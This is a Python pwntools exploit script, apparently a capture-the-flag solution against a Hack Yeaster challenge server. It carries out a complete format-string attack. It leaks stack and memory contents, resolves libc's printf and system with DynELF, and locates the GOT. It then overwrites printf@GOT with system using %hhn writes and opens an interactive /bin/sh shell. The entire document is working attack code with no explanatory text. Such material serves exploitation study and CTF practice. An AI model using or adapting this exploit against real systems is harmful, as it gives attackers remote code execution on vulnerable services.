from pwn import *
conn = remote('ch.hackyeaster.com', 2313)
context.update(arch = 'amd64', os = 'linux')
DEPTH = 100
def exec_payload(payload):
    if '\n' in payload:
        return ""
    conn.sendline("_EOF" + payload)
    conn.recvuntil("_EOF")
    data = conn.recv()
    return data
def find_elf(depth):
    log.info('Finding ELF. This might take a few seconds...')
    for i in range(1, depth + 1):
        data = exec_payload('%' + str(i) + '$p')
        if (len(data) == 8 and data[0:5] == '0x400'):
            log.success('FOUND ELF !')
            return int(data, 16)
start_address_elf = find_elf(DEPTH)
log.info('Using address %s' % hex(start_address_elf))
def find_leak_point():
    log.info('Finding leak point')
    for i in range(1, 200):
        r = exec_payload('%' + str(i) + '$p' + 'AAAAAAAA' + 'BBBBBBBB')
        if '0x4242424242424242' in r: # chr(0x42) = 'B'
            return i
leak_point = find_leak_point()
log.success('FOUND leak point %d' % leak_point)
def leak(addr):
    addr &= (2**64 - 1)
    r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr))
    if r == '':
        return ''
    r = r[:r.index('XXXXXXXX')]
    if r == '(null)':
        return '\x00'
    else:
        return r + '\x00'
d = DynELF(leak, start_address_elf)
dynamic_addr = d.dynamic
printf_addr = d.lookup('printf', 'libc')
system_addr = d.lookup('system', 'libc')
def find_plt_got():
    addr = dynamic_addr
    while True:
        x = d.leak.n(addr, 2)
        if x == '\x03\x00': # type PLTGOT
            addr += 8
            return u64(d.leak.n(addr, 8))
        addr += 0x10
got_addr = find_plt_got()
log.success('FOUND GOT Address: %s' % hex(got_addr))
def find_printf():
    addr = got_addr
    while True:
        x = d.leak.n(addr, 8)
        if x == p64(printf_addr):
            return addr
        addr += 8
printf_got = find_printf()
log.success('FOUND printf@GOT : %s' % hex(printf_got))
def forge_exploit(addr, val):
    ret = ''
    curout = 4
    dist_to_addr = 12 + 8*20
    reader = (dist_to_addr / 8) + 7
    for i in range(8):
        diff = (val & 0xff) - curout
        curout = (val & 0xff)
        val /= 0x100
        if diff < 20:
            diff += 0x100
        ret += '%0' + str(diff) + 'u'
        ret += '%' + str(reader) + '$hhn'
        reader += 1
    ret += 'A'*(dist_to_addr - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret
log.info("SENDING PAYLOAD, PEW PEW !!!")
exec_payload(forge_exploit(printf_got, system_addr))
conn.sendline('/bin/sh')
log.success("ENJOY YOUR SHELL :)")
conn.interactive()
conn.close()
